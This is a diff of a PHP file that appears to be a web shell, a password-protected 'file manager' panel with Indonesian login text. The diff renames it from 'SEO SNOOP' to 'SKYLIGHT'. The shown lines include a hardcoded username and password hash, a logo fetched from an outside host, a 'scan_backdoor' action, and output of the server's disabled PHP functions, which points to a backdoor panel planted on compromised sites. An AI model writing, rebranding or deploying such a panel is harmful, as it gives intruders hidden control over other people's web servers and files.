@@ -3,7 +3,7 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 session_start();
 
-$USERNAME = 'snoop';
+$USERNAME = 'SKYLIGHT';
 $HASHED_PASSWORD = '$2a$12$2OuwFgz1DoRRMvKAe5gXGu0gHHqI9VEjXL9lyNrM7GclxdfiQ4l6.';
 
 if (!isset($_SESSION['logged_in'])) {
@@ -21,7 +21,7 @@ if (!isset($_SESSION['logged_in'])) {
     <html lang="id">
     <head>
         <meta charset="UTF-8">
-        <title>Login - SEO SNOOP</title>
+        <title>Login - SKYLIGHT</title>
         <style>
             @import url("https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap");
             body {
@@ -75,8 +75,8 @@ if (!isset($_SESSION['logged_in'])) {
     </head>
     <body>
         <form method="POST" class="login-box">
-            <img src="https://botstrap.cc/image/skylight.png" alt="SEO SNOOP">
-            <h2>SEO SNOOP PANEL</h2>
+            <img src="https://botstrap.cc/image/skylight.png" alt="SKYLIGHT">
+            <h2>SKYLIGHT</h2>
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit" name="login">MASUK</button>
@@ -517,8 +517,8 @@ if (isset($_POST['scan_backdoor'])) {
 <body>
 <?php echo "<pre>Disable Functions: " . ini_get('disable_functions') . "</pre>"; ?>
 <div style="text-align:center; margin-bottom: 20px;">
-    <img src="https://botstrap.cc/image/skylight.png" alt="SEO SNOOP" style="max-width:200px; border-radius:10px; box-shadow:0 0 15px #ff0000ff;">
-    <h1 style="color:#0f0; font-family:monospace; text-shadow: 0 0 10px rgba(255, 0, 0, 1);">SNOOP FILE MANAGER</h1>
+    <img src="https://botstrap.cc/image/skylight.png" alt="SKYLIGHT" style="max-width:200px; border-radius:10px; box-shadow:0 0 15px #ff0000ff;">
+    <h1 style="color:#0f0; font-family:monospace; text-shadow: 0 0 10px rgba(255, 0, 0, 1);">SKYLIGHT FILE MANAGER</h1>
 </div>
 <p><a href="?logout=1">Logout</a></p>
 
